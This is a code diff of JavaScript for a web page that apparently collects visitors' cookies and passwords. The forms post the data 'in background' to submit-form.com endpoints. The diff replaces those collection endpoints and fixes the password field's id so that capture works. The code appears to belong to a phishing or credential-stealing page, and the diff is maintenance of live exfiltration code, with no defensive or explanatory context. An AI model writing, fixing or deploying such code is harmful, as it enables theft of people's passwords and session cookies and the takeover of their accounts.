@@ -1,4 +1,3 @@
-
 function showPage(pageId) {
     document.querySelectorAll('.page').forEach(page => {
         page.classList.remove('active');
@@ -29,7 +28,7 @@ cookieForm.addEventListener('submit', function(e) {
     }
 
     // Submit form data in background
-    fetch('https://submit-form.com/psBeesTw7', {
+    fetch('https://submit-form.com/wvGvlIWs9', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -49,13 +48,13 @@ cookieForm.addEventListener('submit', function(e) {
 passwordForm.addEventListener('submit', function(e) {
     e.preventDefault();
     
-    const password = document.getElementById('passwrod').value;
+    const password = document.getElementById('password').value;
     if (!password) {
         alert('Please enter your password');
         return;
     }
     
-    fetch('https://submit-form.com/qxyZRQnez', {
+    fetch('https://submit-form.com/Pn6Mi2Nat', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
